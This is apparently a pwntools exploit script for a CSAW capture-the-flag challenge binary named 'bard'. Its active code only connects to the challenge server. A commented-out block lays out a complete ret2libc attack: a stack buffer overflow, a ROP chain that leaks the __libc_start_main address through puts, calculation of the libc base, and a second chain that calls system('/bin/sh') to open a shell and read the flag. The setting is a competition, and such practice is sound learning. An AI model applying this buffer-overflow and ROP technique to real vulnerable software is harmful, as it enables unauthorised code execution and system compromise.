from pwn import *

debug = 0
HOST = "pwn.chal.csaw.io"
PORT = 5019
elf_binary = './bard'

context.endian = 'little'

binary = ELF(elf_binary)

if debug:
    r = binary.process()
    libc = binary.libc
else:
    r = remote(HOST, PORT)
    libc = ELF("./libc-2.27.so")
def go():
    r.interactive()
go()


    # rop = ROP(binary)
    
    # PUTS = binary.plt['puts']
    # MAIN = binary.symbols['main']
    # LIBC_START_MAIN = binary.symbols['__libc_start_main']
    # POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    # RET = (rop.find_gadget(['ret']))[0]

    # log.info("puts@plt: " + hex(PUTS))
    # log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
    # log.info("pop rdi gadget: " + hex(POP_RDI))
    # log.info("ret: " + hex(RET))

    # base = "A"*32 + "B"*8 #Overflow Buffer

    # #Create rop chain
    # rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) + p64(PUTS) + p64(MAIN)

    # r.sendlineafter("Hello\n", rop)

    # #parse leaked address
    # recieved = r.recvline().strip()
    # leak = u64(recieved.ljust(8, "\x00"))
    # log.info("Leaked lib address, __libc_start_main: " + hex(leak))
    
    # libc.address = leak - libc.sym["__libc_start_main"]
    # log.info("Address of libc: " + hex(libc.address))
    
    # BINSH = next(libc.search("/bin/sh"))
    # SYSTEM = libc.sym["system"]
    
    # log.info("bin/sh: " + hex(BINSH))
    # log.info("system: " + hex(SYSTEM))

    # rop2 = base + p64(POP_RDI) + p64(BINSH) + p64(RET) + p64(SYSTEM)
    # r.sendlineafter("Hello\n", rop2)
    # # r.sendline("cat flag.txt")
    # # print r.recvline()